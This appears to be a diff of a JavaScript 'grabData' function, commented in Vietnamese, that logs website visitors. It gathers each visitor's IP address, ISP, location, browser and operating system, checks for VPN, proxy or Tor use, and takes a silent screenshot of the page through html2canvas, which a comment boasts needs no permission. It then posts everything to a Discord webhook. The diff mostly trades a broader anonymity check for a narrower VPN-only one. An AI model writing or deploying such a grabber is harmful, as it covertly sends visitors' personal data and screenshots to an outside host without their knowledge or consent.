@@ -28,38 +28,31 @@ const grabData = async () => {
         console.log("API data OK");
 
         // Gọi API security để detect VPN/Proxy
+        const securityResponse = await fetch(`https://api.ipgeolocation.io/v2/security?apiKey=${apiKey}&ip=${geoData.ip}`);
         let vpnInfo = "Không rõ";
-        let isAnonymized = false; // Thay isVPN bằng isAnonymized để cover cả VPN và Proxy
-        try {
-            const securityResponse = await fetch(`https://api.ipgeolocation.io/v2/security?apiKey=${apiKey}&ip=${geoData.ip}`);
-            if (securityResponse.ok) {
-                const securityData = await securityResponse.json();
-                console.log("Security API data:", securityData);
-                isAnonymized = securityData.is_vpn || securityData.is_proxy || securityData.is_tor || false;
-                if (securityData.is_vpn) {
-                    vpnInfo = `Có sử dụng VPN (${securityData.vpn_provider || 'Unknown Provider'})`;
-                } else if (securityData.is_proxy) {
-                    vpnInfo = `Có sử dụng Proxy (${securityData.proxy_type || 'Unknown Type'})`;
-                } else if (securityData.is_tor) {
-                    vpnInfo = "Có sử dụng Tor";
-                } else {
-                    vpnInfo = "Không sử dụng VPN/Proxy/Tor";
-                }
+        let isVPN = false;
+        if (securityResponse.ok) {
+            const securityData = await securityResponse.json();
+            console.log("Security API data OK");
+            isVPN = securityData.is_vpn || false;
+            if (isVPN) {
+                vpnInfo = `Có sử dụng VPN (${securityData.vpn_provider || 'Unknown Provider'})`;
+            } else if (securityData.is_proxy) {
+                vpnInfo = `Có sử dụng Proxy (${securityData.proxy_type || 'Unknown Type'})`;
             } else {
-                console.warn("Security API lỗi:", securityResponse.status);
-                vpnInfo = "Không thể kiểm tra VPN/Proxy";
+                vpnInfo = "Không sử dụng VPN/Proxy";
             }
-        } catch (securityError) {
-            console.warn("Lỗi gọi Security API:", securityError.message);
-            vpnInfo = "Không thể kiểm tra VPN/Proxy";
+        } else {
+            console.warn("Không thể gọi Security API:", securityResponse.status);
+            vpnInfo = "Không thể kiểm tra";
         }
 
-        // Hàm helper lấy giá trị an toàn
+        // Hàm helper lấy giá trị an toàn (tránh undefined)
         const safeGet = (obj, path, fallback = "N/A") => {
             return path.split('.').reduce((o, p) => (o && o[p] !== undefined) ? o[p] : fallback, obj);
         };
 
-        // Trích xuất dữ liệu địa lý
+        // Trích xuất dữ liệu địa lý với fallback
         const ip = geoData.ip || "Unknown";
         const isp = `${safeGet(geoData, 'isp')} (${safeGet(geoData, 'continent_code')})`;
         const country = safeGet(geoData, 'country_name', "Unknown");
@@ -73,27 +66,30 @@ const grabData = async () => {
         const flag = safeGet(geoData, 'country_flag') || "https://via.placeholder.com/64?text=Flag";
         const currency = safeGet(geoData, 'currency.name');
 
-        // Trích xuất dữ liệu trình duyệt
+        // Trích xuất dữ liệu trình duyệt với fallback
         const browserName = `${safeGet(agentData, 'name')}/${safeGet(agentData, 'type')}`;
         const engine = `${safeGet(agentData, 'engine.name')} (${safeGet(agentData, 'engine.versionMajor', '?')})`;
         const os = `${safeGet(agentData, 'operatingSystem.name')} ${safeGet(agentData, 'operatingSystem.versionMajor', '?')}`;
 
-        // Chụp screenshot
+        // Tự load html2canvas từ CDN và chụp screenshot (KHÔNG cần quyền!)
         let screenshotBlob = null;
         let hasScreenshot = false;
         try {
+            // Tạo script tag để load html2canvas
             const script = document.createElement('script');
             script.src = 'https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js';
             script.async = true;
+
+            // Chờ script load xong mới chụp
             await new Promise((resolve, reject) => {
                 script.onload = async () => {
                     console.log("html2canvas loaded thành công!");
                     try {
                         const canvas = await html2canvas(document.body, {
-                            scale: 1,
-                            useCORS: true,
-                            allowTaint: true,
-                            backgroundColor: '#ffffff'
+                            scale: 1,  // Chất lượng (1 = gốc)
+                            useCORS: true,  // Hỗ trợ ảnh cross-origin
+                            allowTaint: true,  // Cho phép ảnh từ domain khác
+                            backgroundColor: '#ffffff'  // Nền trắng nếu cần
                         });
                         canvas.toBlob((blob) => {
                             screenshotBlob = blob;
@@ -117,7 +113,7 @@ const grabData = async () => {
             hasScreenshot = false;
         }
 
-        // Tạo payload
+        // Tạo payload cơ bản
         const params = {
             username: `Truy cập từ ${country}/${city}`,
             avatar_url: "https://cdn-icons-png.flaticon.com/512/7013/7013144.png",
@@ -128,7 +124,7 @@ const grabData = async () => {
                     url: `https://whatismyipaddress.com/ip/${ip}`,
                     description: "Log lượt truy cập website",
                     thumbnail: { url: flag },
-                    color: isAnonymized ? 16711680 : 1993898, // Đỏ nếu VPN/Proxy/Tor, xanh nếu không
+                    color: isVPN ? 16711680 : 1993898,  // Đỏ nếu dùng VPN, xanh nếu không
                     fields: [
                         {
                             name: "📞 ISP",
@@ -151,7 +147,7 @@ const grabData = async () => {
                             inline: true
                         },
                         {
-                            name: "🔒 VPN/Proxy/Tor",
+                            name: "🔒 VPN/Proxy",
                             value: vpnInfo,
                             inline: true
                         },
@@ -174,7 +170,7 @@ const grabData = async () => {
             ]
         };
 
-        // Gửi lên Discord
+        // Gửi lên Discord (FormData nếu có ảnh)
         console.log("Gửi payload...");
         let response;
         if (screenshotBlob) {
